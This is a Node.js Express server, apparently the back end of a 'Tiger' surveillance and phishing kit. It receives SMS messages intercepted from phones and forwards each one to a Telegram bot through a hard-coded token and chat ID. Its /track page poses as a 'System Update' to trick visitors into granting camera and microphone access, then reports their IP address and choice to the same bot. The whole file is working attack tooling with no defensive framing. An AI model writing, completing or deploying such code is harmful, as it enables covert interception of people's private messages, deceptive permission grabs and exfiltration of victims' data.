const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// --- CONFIGURATION ---
const BOT_TOKEN = '8394719862:AAGdG06eMVj_Mz4hFCqv-jHrmyiSqsDXppk'; 
const CHAT_ID = '7128071523';
// ---------------------

let smsLogs = [];

// 1. Endpoint: Mobile App Data
app.post('/log-sms', async (req, res) => {
    try {
        const { sender, message, device, timestamp } = req.body;
        const newEntry = {
            id: Date.now(),
            sender: sender || 'Unknown',
            message: message || 'Empty',
            device: device || 'Tiger-Device',
            timestamp: timestamp || new Date().toISOString()
        };

        smsLogs.unshift(newEntry);
        if (smsLogs.length > 100) smsLogs.pop();

        const telegramMsg = `🐯 *Tiger SMS Alert!*\n\n` +
                          `📱 *Device:* ${newEntry.device}\n` +
                          `👤 *From:* ${newEntry.sender}\n` +
                          `💬 *Message:* ${newEntry.message}\n` +
                          `⏰ *Time:* ${newEntry.timestamp}`;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: telegramMsg,
            parse_mode: 'Markdown'
        });

        res.status(200).json({ status: 'success' });
    } catch (error) {
        console.error('SMS Error:', error.message);
        res.status(500).json({ status: 'error' });
    }
});

// 2. Link Tracking Page (/track)
app.get('/track', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>System Update</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
                button { background: #1ed760; border: none; padding: 15px 30px; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
            </style>
        </head>
        <body>
            <h1>Update Required</h1>
            <p>Please allow permissions to verify your device hardware.</p>
            <button onclick="startCapture()">Check Hardware</button>

            <script>
                async function startCapture() {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                        alert("Device hardware verified successfully!");
                        
                        fetch('/log-link-access', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ status: 'Permission Granted', type: 'Camera/Mic' })
                        });
                        
                        // Stop stream after access
                        stream.getTracks().forEach(track => track.stop());
                    } catch (err) {
                        alert("Permission denied. Update failed.");
                        fetch('/log-link-access', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ status: 'Permission Denied', type: 'Camera/Mic' })
                        });
                    }
                }
            </script>
        </body>
        </html>
    `);
});

// 3. Endpoint: Log Link Access
app.post('/log-link-access', async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const { status, type } = req.body;

        const msg = `🔗 *Tiger Link Alert!*\n\n` +
                    `📍 *IP:* ${ip}\n` +
                    `🔐 *Action:* ${status}\n` +
                    `🛠 *Type:* ${type}`;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/get-logs', (req, res) => res.json(smsLogs));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('🚀 Server running on port ' + PORT));
